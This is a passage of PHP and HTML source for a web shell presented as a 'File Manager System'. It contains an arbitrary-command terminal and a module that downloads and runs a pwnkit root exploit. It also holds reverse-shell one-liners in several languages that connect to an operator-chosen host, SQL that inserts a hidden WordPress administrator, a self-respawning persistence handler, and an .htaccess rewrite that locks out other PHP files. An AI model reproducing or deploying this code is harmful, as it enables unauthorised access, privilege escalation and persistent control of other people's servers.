            color: #ff1744;
            transform: rotate(90deg) scale(1.2);
        }

        /* Permission Colors */
        .perm-writable {
            color: #64ffda;
        }

        .perm-readonly {
            color: #ef5350;
        }

        /* File size styling */
        .file-size {
            color: #ffd54f;
            font-weight: 500;
        }

        /* Hover tooltips */
        .tooltip-wrapper {
            position: relative;
            display: inline-block;
        }

        .tooltip-wrapper:hover::after {
            content: attr(data-tooltip);
            position: absolute;
            bottom: 125%;
            left: 50%;
            transform: translateX(-50%);
            padding: 8px 12px;
            background: rgba(30, 58, 95, 0.95);
            color: #64ffda;
            border: 1px solid #64ffda;
            border-radius: 6px;
            white-space: nowrap;
            z-index: 1000;
            font-size: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }

        /* Logo/Branding */
        .brand-logo {
            text-align: center;
            margin: 10px 0;
            opacity: 0.7;
            transition: opacity 0.3s ease;
        }

        .brand-logo:hover {
            opacity: 1;
        }

        /* Input file custom */
        input[type="file"]::file-selector-button {
            background: rgba(17, 34, 64, 0.6);
            color: #64ffda;
            border: 1px solid #64ffda;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Roboto Mono', monospace;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        input[type="file"]::file-selector-button:hover {
            background: rgba(100, 255, 218, 0.1);
            color: #64ffda;
        }

        input[type="file"] {
            color: #64ffda;
            font-size: 12px;
        }

        /* Checkbox styling */
        input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: #64ffda;
        }

        /* Select dropdown */
        select {
            background: rgba(17, 34, 64, 0.6);
            color: #64ffda;
            border: 1px solid #64ffda;
            padding: 6px 12px;
            border-radius: 4px;
            font-family: 'Roboto Mono', monospace;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 12px;
        }

        select:hover,
        select:focus {
            background: rgba(17, 34, 64, 0.8);
            outline: none;
        }

        /* Animations */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease;
        }

        /* SweetAlert Bash Theme */
        .swal-bash-theme {
            border: 2px solid #64ffda !important;
            border-radius: 8px !important;
        }

        .swal-btn-bash {
            border: 1px solid #64ffda !important;
            font-family: 'Roboto Mono', monospace !important;
            font-weight: 600 !important;
        }

        .swal-btn-bash:hover {
            box-shadow: 0 0 15px rgba(100, 255, 218, 0.5) !important;
        }

        /* Global Scrollbar Styling */
        * {
            scrollbar-width: thin;
            scrollbar-color: #64ffda rgba(17, 34, 64, 0.6);
        }

        *::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        *::-webkit-scrollbar-track {
            background: rgba(17, 34, 64, 0.6);
            border-radius: 4px;
        }

        *::-webkit-scrollbar-thumb {
            background: #64ffda;
            border-radius: 4px;
        }

        *::-webkit-scrollbar-thumb:hover {
            background: #52e8c5;
        }
    </style>
</head>

<body>
    <div class="header-container fade-in">
        <h1 class="header-title">
            <i class="fa-solid fa-terminal"></i> FILE MANAGER SYSTEM
        </h1>

        <div class="system-info">
            <div class="info-card">
                <i class="fa-solid fa-computer"></i>
                <span class="info-label">System</span>
                <span class="info-value"><?= $fungsi[8](); ?></span>
            </div>

            <div class="info-card">
                <i class="fa-solid fa-server"></i>
                <span class="info-label">Server</span>
                <span class="info-value"><?= $_SERVER["SERVER_SOFTWARE"]; ?></span>
            </div>

            <div class="info-card">
                <i class="fa-solid fa-network-wired"></i>
                <span class="info-label">Network</span>
                <span class="info-value"><?= gethostbyname($_SERVER["SERVER_ADDR"]); ?> | <?= $_SERVER["REMOTE_ADDR"]; ?></span>
            </div>

            <div class="info-card">
                <i class="fa-brands fa-php"></i>
                <span class="info-label">PHP Version</span>
                <span class="info-value"><?= PHP_VERSION; ?></span>
            </div>

            <div class="info-card">
                <i class="fa-solid fa-user"></i>
                <span class="info-label">Current User</span>
                <span class="info-value"><?= $fungsi[9](); ?></span>
            </div>
        </div>
    </div>

    <!-- Tools & Upload Card Wrapper -->
    <div class="tools-upload-wrapper fade-in">
        <form action="" method="post" enctype='<?= "multipart/form-data"; ?>' class="upload-form-inline">
            <div class="file-input-wrapper">
                <input type="file" name="gecko-upload" id="file-upload" class="file-input">
                <label for="file-upload" class="file-label">
                    <i class="fa-solid fa-folder-open"></i>
                    <span class="file-label-text">Choose file</span>
                </label>
                <span class="file-name" id="file-name">No file chosen</span>
            </div>
            <button type="submit" name="gecko-up-submit" class="btn btn-upload">
                <i class="fa-solid fa-cloud-arrow-up"></i> Upload
            </button>
        </form>

        <div class="tools-inline">
            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn">
                <i class="fa-solid fa-terminal"></i> Terminal
            </a>
            <a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn">
                <i class="fa-solid fa-database"></i> Adminer
            </a>
            <a href="?logout" class="btn">
                <i class="fa-solid fa-right-from-bracket"></i> Logout
            </a>
        </div>
    </div>

    <?php
    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="file-manager-container fade-in">
        <div class="action-bar">
            <a href="" id="create_folder" class="action-link">
                <i class="fa-solid fa-folder-plus"></i> Create Folder
            </a>
            <a href="" id="create_file" class="action-link">
                <i class="fa-solid fa-file-circle-plus"></i> Create File
            </a>
        </div>

        <div class="path-navigation">
            <i class="fa-solid fa-folder-tree"></i>&nbsp;
            <?php
            $cwd = str_replace("\\", "/", $get_cwd);
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) {
                windowsDriver();
            }
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '<a href="?d=' . hx('/') . '"><i class="fa-solid fa-house"></i> Root</a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '"> / ' . $val . '</a>';
            }
            echo "<a style='font-weight:bold; color:#ffd54f;' href='?d=" . hx(__DIR__) . "'> <i class='fa-solid fa-house-circle-check'></i> HOME</a>";
            ?>
        </div>

        <form action="" method="post">
            <div class="table-wrapper">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th><i class="fa-solid fa-file-lines"></i> Name</th>
                            <th><i class="fa-solid fa-weight-hanging"></i> Size</th>
                            <th><i class="fa-solid fa-shield-halved"></i> Permission</th>
                            <th><i class="fa-solid fa-gears"></i> Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($file_manager as $_D) : ?>
                            <?php if ($fungsi[2]($_D)) : ?>
                                <tr>
                                    <td>
                                        <input type="checkbox" name="check[]" value="<?= $_D ?>">
                                        <i class="fa-solid fa-folder" style="color:#ffd54f; font-size: 18px;"></i>
                                        <a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a>
                                    </td>
                                    <td><span class="badge badge-dir">DIR</span></td>
                                    <td class="<?php echo $fungsi[4]($fungsi[0]() . '/' . $_D) ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo perms($fungsi[0]() . '/' . $_D); ?>
                                    </td>
                                    <td>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="action-icon tooltip-wrapper" data-tooltip="Rename">
                                            <i class="fa-solid fa-pen-to-square"></i>
                                        </a>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="action-icon tooltip-wrapper" data-tooltip="Change Permission">
                                            <i class="fa-solid fa-user-pen"></i>
                                        </a>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endforeach; ?>

                        <?php foreach ($file_manager as $_F) : ?>
                            <?php if ($fungsi[3]($_F)) : ?>
                                <tr>
                                    <td>
                                        <input type="checkbox" name="check[]" value="<?= $_F ?>">
                                        <?= file_ext($_F) ?>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a>
                                    </td>
                                    <td><span class="file-size"><?= formatSize(filesize($_F)); ?></span></td>
                                    <td class="<?php echo is_writable($fungsi[0]() . '/' . $_F) ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo perms($fungsi[0]() . '/' . $_F); ?>
                                    </td>
                                    <td>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Rename">
                                            <i class="fa-solid fa-pen-to-square"></i>
                                        </a>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Change Permission">
                                            <i class="fa-solid fa-user-pen"></i>
                                        </a>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="action-icon tooltip-wrapper" data-tooltip="Download">
                                            <i class="fa-solid fa-download"></i>
                                        </a>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
            <div class="bulk-actions">
                <select name="gecko-select" class="btn">
                    <option value="delete">Delete Selected</option>
                    <option value="unzip">Unzip Selected</option>
                    <option value="zip">Zip Selected</option>
                </select>
                <button type="submit" name="submit-action" class="btn">
                    <i class="fa-solid fa-check"></i> Execute Action
                </button>
            </div>
        </form>

        <!-- Modal Pop Jquery Create Folder/File -->
        <div class="modal">
            <div class="modal-container">
                <div class="modal-header">
                    <h3 id="modal-title"><i class="fa-solid fa-folder-plus"></i> Create New</h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div id="modal-body-bc"></div>
                        <span id="modal-input"></span>
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submit" class="btn">
                            <i class="fa-solid fa-check"></i> Submit
                        </button>
                        <button type="button" class="btn" id="close-modal">
                            <i class="fa-solid fa-xmark"></i> Close
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <?php if (isset($_GET['cpanelreset'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fa-solid fa-key"></i> Cpanel Reset</h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <input type="email" name="resetcp" class="modal-input" placeholder="Your email: example@mail.com">
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submit" class="btn">
                            <i class="fa-solid fa-paper-plane"></i> Submit
                        </button>
                        <a class="btn" href="?d=<?= hx($fungsi[0]()) ?>">
                            <i class="fa-solid fa-xmark"></i> Close
                        </a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['createwp'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3 class="text-center">
                        <i class="fa-brands fa-wordpress"></i> CREATE WORDPRESS ADMIN
                    </h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <input type="text" name="db_name" class="modal-input" placeholder="Database Name">
                        <input type="text" name="db_user" class="modal-input" placeholder="Database User">
                        <input type="text" name="db_password" class="modal-input" placeholder="Database Password">
                        <input type="text" name="db_host" class="modal-input" placeholder="Database Host" value="127.0.0.1">
                        <hr style="border: 1px solid #64ffda; margin: 20px 0;">
                        <input type="text" name="wp_user" class="modal-input" placeholder="WordPress Username">
                        <input type="text" name="wp_pass" class="modal-input" placeholder="WordPress Password">
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submitwp" class="btn">
                            <i class="fa-solid fa-check"></i> Create Admin
                        </button>
                        <a class="btn" href="?d=<?= hx($fungsi[0]()) ?>">
                            <i class="fa-solid fa-xmark"></i> Close
                        </a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fa-solid fa-network-wired"></i> Backconnect</h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="modal-input" name="gecko-bc">
                            <option value="-">Choose Backconnect Type</option>
                            <option value="perl">Perl</option>
                            <option value="python">Python</option>
                            <option value="ruby">Ruby</option>
                            <option value="bash">Bash</option>
                            <option value="php">PHP</option>
                            <option value="nc">Netcat</option>
                            <option value="sh">Shell</option>
                            <option value="xterm">Xterm</option>
                            <option value="golang">Golang</option>
                        </select>
                        <input type="text" name="backconnect-host" class="modal-input" placeholder="Host (e.g., 127.0.0.1)">
                        <input type="number" name="backconnect-port" class="modal-input" placeholder="Port (e.g., 1337)">
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submit-bc" class="btn">
                            <i class="fa-solid fa-play"></i> Connect
                        </button>
                        <a class="btn" href="?d=<?= hx($fungsi[0]()) ?>">
                            <i class="fa-solid fa-xmark"></i> Close
                        </a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['mailer'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fa-solid fa-envelope"></i> PHP Mailer</h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <textarea name="message-smtp" class="modal-textarea" placeholder="Your message here..."></textarea>
                        <input type="text" name="mailto-subject" class="modal-input" placeholder="Subject">
                        <input type="email" name="mail-from-smtp" class="modal-input" placeholder="From: example@mail.com">
                        <input type="email" name="mail-to-smtp" class="modal-input" placeholder="To: example@mail.com">
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submit" class="btn">
                            <i class="fa-solid fa-paper-plane"></i> Send Mail
                        </button>
                        <a class="btn" href="?d=<?= hx($fungsi[0]()) ?>">
                            <i class="fa-solid fa-xmark"></i> Close
                        </a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['f']) : ?>
        <div class="code-editor" style="display: block;">
            <div class="code-editor-container">
                <div class="code-editor-head">
                    <h3><i class="fa-solid fa-code"></i> Code Editor: <?= unx($_GET['f']); ?></h3>
                </div>
                <div class="code-editor-body">
                    <form action="" method="post" style="flex: 1; display: flex; flex-direction: column; min-height: 0;">
                        <div style="flex: 1; min-height: 0; overflow: hidden;">
                            <textarea name="code-editor" id="code" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                        </div>
                        <div class="modal-footer" style="margin-top: 15px; flex-shrink: 0;">
                            <button type="submit" name="save-editor" class="btn">
                                <i class="fa-solid fa-floppy-disk"></i> Save Changes
                            </button>
                            <button type="button" class="btn" id="close-editor">
                                <i class="fa-solid fa-xmark"></i> Close
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['terminal'] == "normal") : ?>
        <div class="terminal" style="display: flex;">
            <div class="terminal-container">
                <div class="terminal-head">
                    <h3><i class="fa-solid fa-terminal"></i> Terminal</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="close-btn">
                        <i class="fa-solid fa-xmark"></i>
                    </a>
                </div>
                <div class="terminal-body">
                    <textarea disabled><?php
                                        if (isset($_POST['terminal'])) {
                                            echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
                                        }
                                        ?></textarea>
                    <form action="" method="post">
                        <div class="terminal-input-group">
                            <input type="text" name="terminal-text" class="terminal-input" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["SERVER_ADDR"]; ?>" autofocus>
                            <button type="submit" name="terminal" class="btn">
                                <i class="fa-solid fa-play"></i> Execute
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal" style="display: flex;">
            <div class="terminal-container">
                <div class="terminal-head">
                    <h3><i class="fa-solid fa-user-shield"></i> Root Terminal</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="close-btn">
                        <i class="fa-solid fa-xmark"></i>
                    </a>
                </div>
                <div class="terminal-body">
                    <textarea disabled><?php
                                        if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                            $response = $fungsi[11]('.mad-root');
                                            $r_text = explode(" ", $response);
                                            if ($r_text[0] == "uid=0(root)") {
                                                if (isset($_POST['submit-root'])) {
                                                    echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                                                }
                                            } else {
                                                echo "This Device Is Not Vulnerable\n";
                                                echo cmd('cat /etc/os-release') . "\n";
                                                echo "Kernel Version: " . suggest_exploit() . "\n";
                                            }
                                        } else {
                                            $fungsi[24]('.mad-root');
                                        }
                                        ?></textarea>
                    <form action="" method="post">
                        <div class="terminal-input-group">
                            <input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root@" . $_SERVER["SERVER_ADDR"]; ?>" autofocus>
                            <button type="submit" name="submit-root" class="btn">
                                <i class="fa-solid fa-play"></i> Execute
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['re'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fa-solid fa-pen-to-square"></i> Rename: <?= unx($_GET['re']) ?></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <input type="text" name="renameFile" class="modal-input" placeholder="Enter new name">
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submit" class="btn">
                            <i class="fa-solid fa-check"></i> Rename
                        </button>
                        <button type="button" class="btn close-btn-s">
                            <i class="fa-solid fa-xmark"></i> Close
                        </button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fa-solid fa-shield-halved"></i> Change Permission: <?= unx($_GET['ch']) ?></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <input type="number" name="chFile" class="modal-input" placeholder="Enter permission (e.g., 0755)">
                    </div>
                    <div class="modal-footer">
                        <button type="submit" name="submit" class="btn">
                            <i class="fa-solid fa-check"></i> Change
                        </button>
                        <button type="button" class="btn close-btn-s">
                            <i class="fa-solid fa-xmark"></i> Close
                        </button>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>

    <script>
        $(document).ready(function() {
            $('#create_folder').click(function(e) {
                e.preventDefault();
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i> Create Folder');
                $('#modal-input').html('<input type="text" name="create_folder" class="modal-input" placeholder="Enter folder name">');
            });

            $('#create_file').click(function(e) {
                e.preventDefault();
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i> Create File');
                $('#modal-input').html('<input type="text" name="create_file" class="modal-input" placeholder="Enter file name with extension">');
            });

            $('#lock-file').click(function(e) {
                e.preventDefault();
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i> Lock File');
                $('#modal-input').html('<input type="text" name="lockfile" class="modal-input" placeholder="Enter file name to lock">');
            });

            $('#root-user').click(function(e) {
                e.preventDefault();
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i> Add User');
                $('#modal-input').html('<input type="text" name="add-username" class="modal-input" placeholder="Username"><input type="text" name="add-password" class="modal-input" placeholder="Password" style="margin-top: 15px;">');
            });

            $('#create-rdp').click(function(e) {
                e.preventDefault();
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-desktop"></i> Create RDP');
                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-input" placeholder="RDP Username"><input type="text" name="add-rdp-pass" class="modal-input" placeholder="RDP Password" style="margin-top: 15px;">');
            });

            $('#close-modal').click(function(e) {
                e.preventDefault();
                $('.modal').hide();
            });

            $('#close-editor').click(function(e) {
                e.preventDefault();
                $('.code-editor').hide();
            });

            $('.close-terminal').click(function(e) {
                e.preventDefault();
                $('.terminal').hide();
            });

            $('.close-btn-s').click(function(e) {
                e.preventDefault();
                $('.modal').hide();
            });

            var myTextarea = document.getElementById("code");
            if (myTextarea) {
                var editor = CodeMirror.fromTextArea(myTextarea, {
                    mode: "xml",
                    lineNumbers: true,
                    lineWrapping: true,
                    theme: "ayu-mirage",
                    extraKeys: {
                        "Ctrl-Space": "autocomplete"
                    },
                    hintOptions: {
                        completeSingle: false,
                    },
                });
            }

            // File input handler
            var fileInput = document.getElementById('file-upload');
            var fileName = document.getElementById('file-name');
            if (fileInput && fileName) {
                fileInput.addEventListener('change', function(e) {
                    if (this.files && this.files.length > 0) {
                        fileName.textContent = this.files[0].name;
                    } else {
                        fileName.textContent = 'No file chosen';
                    }
                });
            }
        });
    </script>
</body>

</html>
<?php

if (isset($_POST['submitwp'])) {
    $db_name = $_POST['db_name'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_host = $_POST['db_host'];
    $wp_user = $_POST['wp_user'];
    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);

    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

    if ($conn->connect_error) {
        failed();
        die("Error Cug : " . $conn->connect_error);
    }

    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'MadExploits', '', '', NOW(), '', 0, 'MadExploits')";

    $sqltakeuserid = "SELECT ID FROM wp_users WHERE user_login = '$wp_user'";

    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
        $result = $conn->query($sqltakeuserid);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $user_id = $row["ID"];

            $sqlusermeta = "INSERT INTO wp_usermeta (umeta_id, user_id, meta_key, meta_value) VALUES ('', $user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";

            if ($conn->query($sqlusermeta) === TRUE) {
                Success();
            } else {
                echo "Error: " . $sqlusermeta . "
" . $conn->error;
            }
        } else {
            echo "User tidak ditemukan.
";
        }

        Success();
    } else {
        echo "Error: " . $sql . "
" . $conn->error;
    }

    $conn->close();
}



if (isset($_GET['unlockshell'])) {
    if (cmd("killall -9 php") && cmd("pkill -9 php")) {
        success();
    } else {
        failed();
    }
}

if (isset($_POST['submit-bc'])) {
    $HostServer = $_POST['backconnect-host'];
    $PortServer = $_POST['backconnect-port'];
    if ($_POST['gecko-bc'] == "perl") {
        echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
    } else if ($_POST['gecko-bc'] == "python") {
        echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
    } else if ($_POST['gecko-bc'] == "ruby") {
        echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
    } else if ($_POST['gecko-bc'] == "bash") {
        echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['gecko-bc'] == "php") {
        echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
    } else if ($_POST['gecko-bc'] == "nc") {
        echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
    } else if ($_POST['gecko-bc'] == "sh") {
        echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
    } else if ($_POST['gecko-bc'] == "xterm") {
        echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
    } else if ($_POST['gecko-bc'] == "golang") {
        echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
    }
}



if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = ' 
<?php 
@ini_set("max_execution_time", 0); 
while (True){ 
    if (!file_exists("' . __DIR__ . '")){ 
        mkdir("' . __DIR__ . '"); 
    } 
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){ 
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '")); 
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text)); 
    } 
    if (gecko_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){ 
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444); 
    } 
    if (gecko_perm("' . __DIR__ . '") != 0555){ 
        chmod("' . __DIR__ . '", 0555); 
    } 
} 
 
function gecko_perm($flename){ 
    return substr(sprintf("%o", fileperms($flename)), -4); 
} 
';
    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
        success();
    } else {
        failed();
    }
}
if (isset($_POST['gecko-up-submit'])) {
    if (isset($_FILES['gecko-upload']) && $_FILES['gecko-upload']['error'] == 0) {
        $namaFilenya = $_FILES['gecko-upload']['name'];
        $tmpName = $_FILES['gecko-upload']['tmp_name'];
        $fileSize = $_FILES['gecko-upload']['size'];

        if ($fileSize > 0 && is_uploaded_file($tmpName)) {
            $targetPath = $fungsi[0]() . "/" . $namaFilenya;

            if ($fungsi[29]($tmpName, $targetPath)) {
                clearstatcache();
                if (file_exists($targetPath) && filesize($targetPath) > 0) {
                    success();
                } else {
                    @unlink($targetPath);
                    if (copy($tmpName, $targetPath)) {
                        success();
                    } else {
                        failed();
                    }
                }
            } else {
                if (copy($tmpName, $targetPath)) {
                    success();
                } else {
                    failed();
                }
            }
        } else {
            failed();
        }
    } else {
        failed();
    }
}

if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["DOCUMENT_ROOT"];
    $CurrentFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = ' 
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$"> 
    Deny from all 
</FilesMatch> 
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$"> 
    Allow from all 
</FilesMatch> 
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$"> 
    Allow from all 
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    if (!$fungsi[3]('adminer.php')) {
        $fungsi[28]("adminer.php", $fungsi[11]($URL));
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['gecko-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Diperbaiki: \\ untuk escape backslash
            $fd = $repl . "/" . $it;
            if (is_dir($fd) || is_file($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[24]($fd);
                if ($rmdir || $rmfile) {
                    success();
                } else if ($rmdir && $rmfile) {
                    success();
                } else {
                    failed();
                }
            }
        }
    } else if ($_POST['gecko-select'] == 'unzip') {
